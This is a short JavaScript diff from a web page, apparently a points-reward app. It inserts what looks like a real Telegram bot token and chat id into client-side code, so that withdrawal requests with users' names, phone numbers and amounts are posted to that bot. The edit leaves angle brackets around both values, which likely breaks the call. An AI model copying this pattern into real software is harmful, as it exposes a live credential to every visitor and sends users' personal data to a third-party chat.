@@ -121,11 +121,11 @@
       document.getElementById('earned-points').textContent = earnedPoints.toFixed(1);
       localStorage.setItem('earnedPoints', earnedPoints.toFixed(1));
       
-      fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage', {
+      fetch('https://api.telegram.org/bot<7888384699:AAFJKRYes81cyZPyCgapO11mdotdi9W74YY>/sendMessage', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-          chat_id: '<YOUR_CHAT_ID>',
+          chat_id: '<6140196943>',
           text: `Withdraw Request:\nUser: ${userName}\nMethod: ${method}\nPhone: ${phone}\nAmount: ${amount} points`
         })
       })
